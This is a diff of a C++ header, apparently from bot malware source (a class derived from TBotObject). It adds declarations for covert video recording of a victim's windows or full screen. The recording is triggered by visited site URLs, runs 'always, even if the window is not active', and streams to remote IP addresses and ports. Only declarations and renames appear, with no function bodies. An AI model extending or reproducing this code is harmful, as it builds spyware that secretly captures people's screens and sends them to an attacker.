@@ -24,6 +24,10 @@ const DWORD VIDEORECORD_DEFAULT_PORT = 700;
 
 
 
+static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
+static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно
+
+
 //****************************************************
 //  TVideoRecDLL - класс для работы с библиотекой
 //                 видеозаписи
@@ -31,9 +35,6 @@ const DWORD VIDEORECORD_DEFAULT_PORT = 700;
 class TVideoRecDLL : public TBotObject
 {
 private:
-
-	static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
-	static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно
 
 	// определяем типы функци1
 	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
@@ -84,8 +85,9 @@ public:
 	TVideoRecorder();
 	~TVideoRecorder();
 
-	void ReccordProcess(DWORD PID);
-	void ReccordCurrentProcess();
+	void RecordProcess(DWORD PID);
+	void RecordCurrentProcess();
+	void RecordWnd(HWND Wnd);
 };
 
 
@@ -130,6 +132,12 @@ namespace VideoRecorderSrv
 	// URL - адрес сайт для которого инициализирована запись.
 	//-----------------------------------------------------
 	bool StartRecording(PCHAR URL);
+
+	//-----------------------------------------------------
+	//  StartInfiniteRecording - Функция запускает
+	//  бесконечную запись в полноэкранном режиме
+	//-----------------------------------------------------
+	bool StartInfiniteRecording(const char* VideoName);
 
 	//-----------------------------------------------------
 	// StopRecording - Функция останавливает запуск записи
